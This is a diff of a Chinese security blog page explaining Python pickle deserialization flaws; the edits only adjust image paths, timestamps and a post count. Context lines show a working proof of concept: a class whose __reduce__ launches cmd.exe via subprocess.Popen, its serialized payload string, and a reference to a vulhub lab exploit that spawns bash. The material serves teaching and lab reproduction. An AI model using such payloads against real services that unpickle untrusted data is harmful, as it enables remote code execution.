@@ -87,13 +87,13 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="0x01 前言数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。 主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。 引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Rub">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/浅析python-unpickle反序列化漏洞/1.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/浅析python-unpickle反序列化漏洞/2.png">
-<meta property="og:updated_time" content="2018-04-19T03:03:53.678Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png">
+<meta property="og:updated_time" content="2019-02-21T12:01:30.319Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅析python unpickle反序列化漏洞">
 <meta name="twitter:description" content="0x01 前言数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。 主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。 引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Rub">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/浅析python-unpickle反序列化漏洞/1.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png">
 
 
 
@@ -441,7 +441,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">m3lon</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (subprocess.Popen,((<span class="string">'cmd.exe'</span>,),))</span><br><span class="line">  </span><br><span class="line">pickle.dumps(m3lon())</span><br><span class="line"><span class="comment"># 输出："csubprocess\nPopen\np0\n((S'cmd.exe'\np1\ntp2\ntp3\nRp4\n."</span></span><br></pre></td></tr></table></figure>
 <p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p>
 <p>下面模拟接收端</p>
-<p><img src="浅析python-unpickle反序列化漏洞/1.png" alt=""></p>
+<p><img src="1.png" alt=""></p>
 <p>弹出shell！</p>
 <h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p>
 <p>app.py</p>
@@ -454,7 +454,7 @@
 <p>接收端在反序列化pickle.loads(user)过程中会自动执行__reduce__方法，弹出bash.</p>
 <p><strong>流程</strong></p>
 <p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p>
-<p><img src="浅析python-unpickle反序列化漏洞\2.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
 <p>利用成功，如果想进行更深入的反序列化漏洞学习，可以看P神的<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">掌阅iReader某站Python漏洞挖掘</a></p>
 <p>参考：</p>
 <p><a href="http://www.vuln.cn/8094" target="_blank" rel="noopener">Python Pickle反序列化带来的安全问题</a></p>
@@ -610,7 +610,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
